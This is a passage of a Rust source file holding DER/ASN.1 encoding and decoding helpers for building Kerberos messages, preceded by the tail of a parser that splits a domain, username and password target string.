        if let Some(colon) = rest.find(':') {
            ParsedTarget {
                domain,
                username: Some(rest[..colon].to_string()),
                password: Some(rest[colon + 1..].to_string()),
            }
        } else {
            ParsedTarget { domain, username: Some(rest.to_string()), password: None }
        }
    } else {
        ParsedTarget { domain: s.to_string(), username: None, password: None }
    }
}


pub fn enc_len(len: usize, out: &mut Vec<u8>) {
    if len < 0x80 {
        out.push(len as u8);
    } else if len <= 0xFF {
        out.push(0x81);
        out.push(len as u8);
    } else if len <= 0xFFFF {
        out.push(0x82);
        out.push((len >> 8) as u8);
        out.push(len as u8);
    } else if len <= 0xFF_FFFF {
        out.push(0x83);
        out.push((len >> 16) as u8);
        out.push((len >> 8) as u8);
        out.push(len as u8);
    } else {
        out.push(0x84);
        out.extend_from_slice(&(len as u32).to_be_bytes());
    }
}

pub fn enc_tlv(tag: u8, payload: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(payload.len() + 6);
    out.push(tag);
    enc_len(payload.len(), &mut out);
    out.extend_from_slice(payload);
    out
}

/// Tag context-specific constructed: [n]
pub fn ctx_tag(n: u8) -> u8 {
    0xA0 | n
}

/// Tag application constructed: [APPLICATION n]
pub fn app_tag(n: u8) -> u8 {
    0x60 | n
}

/// INTEGER (universal, primitive). Codifica como complemento a dos minimal.
pub fn enc_integer(v: i64) -> Vec<u8> {
    let bytes = v.to_be_bytes(); // 8 bytes
    // Encontrar el byte significativo más alto, manteniendo signo
    let mut start = 0usize;
    while start < 7 {
        let b = bytes[start];
        let next = bytes[start + 1];
        // Si los bits altos son redundantes con el siguiente byte, los podemos quitar
        if (b == 0x00 && (next & 0x80) == 0) || (b == 0xFF && (next & 0x80) != 0) {
            start += 1;
        } else {
            break;
        }
    }
    enc_tlv(0x02, &bytes[start..])
}

/// Unsigned INTEGER (common in Kerberos: pvno, msg-type, nonce, etype, etc.)
pub fn enc_uint(v: u64) -> Vec<u8> {
    enc_integer(v as i64)
}

/// OCTET STRING (universal, primitive)
pub fn enc_octet_string(data: &[u8]) -> Vec<u8> {
    enc_tlv(0x04, data)
}

/// GeneralString (universal, primitive). 
/// with ASCII / IA5 content; for our purposes we can dump the UTF-8 bytes as-is
/// (usernames and domain names in AD are ASCII in practice).
pub fn enc_general_string(s: &str) -> Vec<u8> {
    enc_tlv(0x1B, s.as_bytes())
}

/// GeneralizedTime (universal, primitive). Format YYYYMMDDHHMMSSZ.
pub fn enc_generalized_time(t: chrono::DateTime<chrono::Utc>) -> Vec<u8> {
    let s = t.format("%Y%m%d%H%M%SZ").to_string();
    enc_tlv(0x18, s.as_bytes())
}

/// BIT STRING (universal, primitive). `bits` se interpreta big-endian, MSB-first.
/// `unused_bits` indica cuántos bits del último byte son padding (típicamente 0 para
/// bit strings de tamaño múltiplo de 8 como KDCOptions de 32 bits).
pub fn enc_bit_string(bits: &[u8], unused_bits: u8) -> Vec<u8> {
    let mut payload = Vec::with_capacity(bits.len() + 1);
    payload.push(unused_bits);
    payload.extend_from_slice(bits);
    enc_tlv(0x03, &payload)
}

pub fn enc_sequence(payload: &[u8]) -> Vec<u8> {
    enc_tlv(0x30, payload)
}

/// Concatenates several items and wraps them as SEQUENCE OF (same tag as SEQUENCE)
pub fn enc_sequence_of(items: &[Vec<u8>]) -> Vec<u8> {
    let mut payload = Vec::new();
    for it in items {
        payload.extend_from_slice(it);
    }
    enc_sequence(&payload)
}

/// Wrap a payload with an explicit context tag [n] (constructed).
pub fn enc_explicit(tag_num: u8, inner: &[u8]) -> Vec<u8> {
    enc_tlv(ctx_tag(tag_num), inner)
}


#[derive(Clone)]
pub struct DerCursor<'a> {
    data: &'a [u8],
}

impl<'a> DerCursor<'a> {
    pub fn new(data: &'a [u8]) -> Self {
        Self { data }
    }

    pub fn rest(&self) -> &'a [u8] {
        self.data
    }

    pub fn is_empty(&self) -> bool {
        self.data.is_empty()
    }

     /// Reads a single TLV: returns (tag, payload, rest).
    pub fn next_tlv(&self) -> Result<(u8, &'a [u8], &'a [u8])> {
        if self.data.is_empty() {
            bail!("DER: buffer vacío");
        }
        let tag = self.data[0];
        let (len, len_bytes) = decode_len(&self.data[1..])?;
        let header = 1 + len_bytes;
        if self.data.len() < header + len {
            bail!(
                "DER: longitud {} excede buffer ({} disponibles)",
                len,
                self.data.len() - header
            );
        }
        let payload = &self.data[header..header + len];
        let rest = &self.data[header + len..];
        Ok((tag, payload, rest))
    }

    /// Advances by consuming the current TLV.
    pub fn advance(&mut self) -> Result<(u8, &'a [u8])> {
        let (tag, payload, rest) = self.next_tlv()?;
        self.data = rest;
        Ok((tag, payload))
    }

    /// Iterates looking for a field with a specific tag (typically a context tag).
    /// Returns its payload if found; otherwise None.
    /// Does not consume the cursor; clones it.
    pub fn find_tag(&self, tag: u8) -> Option<&'a [u8]> {
        let mut cur = self.clone();
        while !cur.is_empty() {
            match cur.advance() {
                Ok((t, p)) => {
                    if t == tag {
                        return Some(p);
                    }
                }
                Err(_) => return None,
            }
        }
        None
    }
}

fn decode_len(bytes: &[u8]) -> Result<(usize, usize)> {
    if bytes.is_empty() {
        bail!("DER: faltan bytes para la longitud");
    }
    let first = bytes[0];
    if first & 0x80 == 0 {
        return Ok((first as usize, 1));
    }
    let n = (first & 0x7F) as usize;
    if n == 0 || n > 4 {
        bail!("DER: longitud indefinida o >4 bytes no soportada");
    }
    if bytes.len() < 1 + n {
        bail!("DER: bytes de longitud truncados");
    }
    let mut len = 0usize;
    for &b in &bytes[1..1 + n] {
        len = (len << 8) | b as usize;
    }
    Ok((len, 1 + n))
}

pub fn decode_integer(payload: &[u8]) -> Result<i64> {
    if payload.is_empty() || payload.len() > 8 {
        bail!("INTEGER: invalid size {}", payload.len());
    }
    let mut buf = if payload[0] & 0x80 != 0 {
        [0xFFu8; 8]
    } else {
        [0x00u8; 8]
    };
    let off = 8 - payload.len();
    buf[off..].copy_from_slice(payload);
    Ok(i64::from_be_bytes(buf))
}


pub fn unwrap_inner(payload: &[u8]) -> Result<(u8, &[u8])> {
    let cur = DerCursor::new(payload);
    let (tag, p, _) = cur.next_tlv()?;
    Ok((tag, p))
}
